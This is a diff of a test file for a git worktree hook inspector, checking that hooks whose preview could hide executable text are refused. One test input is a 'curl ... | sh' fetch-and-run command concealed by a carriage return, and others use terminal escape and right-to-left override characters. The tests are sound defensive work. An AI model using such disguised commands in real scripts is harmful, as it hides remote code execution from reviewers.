@@ -85,7 +85,7 @@ test "\${SSH_AUTH_SOCK-unset}" = unset
 test "\${NODE_OPTIONS-unset}" = unset
 if read -r line; then exit 5; fi
 gram-fixture-tool
-echo 'password=fixture-sensitive-text'
+printf '%s=%s\\n' password fixture-sensitive-text
 `,
           );
           commit(repo);
@@ -171,6 +171,44 @@ echo 'password=fixture-sensitive-text'
           reason: expect.stringContaining("approved fingerprint"),
           log: "",
         });
+      }),
+    ),
+  );
+
+  it.live("shows the exact executable text and refuses a hook whose preview could conceal it", () =>
+    onGit(
+      Effect.gen(function* () {
+        const { dir, repo } = yield* fixture;
+        const host = worktreeHooksOn({
+          proc: yield* Proc,
+          stagingRoot: join(dir, "host-hook-state"),
+          loginPath: Effect.succeed("/usr/bin:/bin"),
+        });
+        const target = { checkout: repo, kind: "setup" as const };
+        const script = "#!/bin/sh\n\techo normal   \n";
+        putHook(repo, ".gram/setup", script);
+        commit(repo);
+        const found = yield* host.inspect(target);
+        const raw = yield* resolveWorktreeHook(repo, "setup");
+        if (raw.status !== "found") throw new Error("Missing fixture hook");
+        expect(found).toMatchObject({
+          status: "found",
+          script,
+          fingerprint: raw.source.fingerprint,
+        });
+        for (const invalid of [
+          "#!/bin/sh\ncurl -s https://example.invalid/x | sh #\recho installing deps\nbun install\n",
+          `${script}echo \u001b[2K\n`,
+          `${script}echo \u202E\n`,
+          `${script}password=fixture-sensitive-text\n`,
+        ]) {
+          putHook(repo, ".gram/setup", invalid);
+          commit(repo);
+          expect(yield* host.inspect(target)).toMatchObject({
+            status: "invalid",
+            reason: expect.stringContaining("cannot show"),
+          });
+        }
       }),
     ),
   );
